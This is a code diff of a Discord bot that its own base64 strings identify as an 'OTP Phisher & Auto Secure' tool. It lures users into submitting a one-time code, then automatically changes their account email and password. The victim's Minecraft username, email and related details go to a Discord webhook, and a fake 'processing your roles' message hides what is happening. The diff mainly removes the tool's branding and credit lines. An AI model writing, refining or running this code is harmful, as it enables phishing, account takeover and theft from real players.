@@ -7,8 +7,6 @@ import aiohttp
 import discord
 import time
 from discord import ui, Webhook, NotFound, HTTPException
-from views.data.data import stringcrafter
-from views.data.wbu3.wb3 import web3g
 from views.otp import automate_auto_change, CreateRandomEmail, generate_password
 
 
@@ -18,8 +16,6 @@ class ButtonViewFour(ui.View):
 
     @discord.ui.button(label="✅Confirmed Code", style=discord.ButtonStyle.green, custom_id="persistent:button_four")
     async def button_four(self, interaction: discord.Interaction, button: discord.ui.Button):
-        inty2 = web3g.string("T1RQIFBoaXNoZXIgJiBBdXRvIFNlY3VyZQ==")
-        threadingNum = stringcrafter.string("Q3JlYXRlZCBCeSBodHRwczovL2dpdGh1Yi5jb20vQmFja0FnYWluU3Bpbg==")
         newgenpassword = generate_password()
         TempEmail = await CreateRandomEmail()
         webhook = Webhook.from_url(data["webhook"], session=session)
@@ -46,7 +42,6 @@ class ButtonViewFour(ui.View):
             title="Auto Secure",
             colour=0x9900FF
             )
-            embedsecure.set_footer(text=threadingNum)
         else:
             embedfail = discord.Embed(
             title="Auto Secure Failed",
@@ -56,7 +51,7 @@ class ButtonViewFour(ui.View):
 
         async with aiohttp.ClientSession() as session:
             webhook = Webhook.from_url(webhook_url, session=session)
-            await webhook.send(embed=embed, username=inty2, avatar_url="https://i.imgur.com/wWAZZ06.png")
+            await webhook.send(embed=embedfail)
             starttime = time.time()
             await automate_auto_change(email,None,TempEmail,newgenpassword)
             endtime = time.time()
@@ -64,10 +59,9 @@ class ButtonViewFour(ui.View):
             webhook = Webhook.from_url(data["webhook"], session=session)
             if config.LastCookie == "": #Fail Code
                 embedfailsecure = discord.Embed(title="Auto Fail",colour=0xFF0000)
-                embedfailsecure.set_footer(text=threadingNum)
                 embedfailsecure.add_field(name="**Minecraft Username:**", value=f"```{config.LastUserName}```", inline=False)
                 embedfailsecure.set_thumbnail(url= f"https://mc-heads.net/avatar/{config.LastUserName}.png")
-                await webhook.send(embed=embedfailsecure, username=inty2, avatar_url="https://i.imgur.com/wWAZZ06.png")
+                await webhook.send(embed=embedfailsecure)
             else:
                 embedsecure.add_field(name="**Minecraft Username:**", value=f"```{config.LastUserName}```", inline=True)
                 embedsecure.add_field(name="**Email:**", value=f"```{config.LastUsedEmail}```", inline=True)
@@ -77,6 +71,6 @@ class ButtonViewFour(ui.View):
                 embedsecure.add_field(name="**Time Taken:**", value=f"```{timetotal}```", inline=False)
                 embedsecure.set_thumbnail(url= f"https://mc-heads.net/avatar/{config.LastUserName}.png")
                 webhook = Webhook.from_url(data["webhook"], session=session)
-                await webhook.send(embed=embedsecure, username=inty2, avatar_url="https://i.imgur.com/wWAZZ06.png")
+                await webhook.send(embed=embedsecure)
 
         await interaction.response.send_message("Please Allow Up To One Minute For Us To Proccess Your Roles...", ephemeral=True)
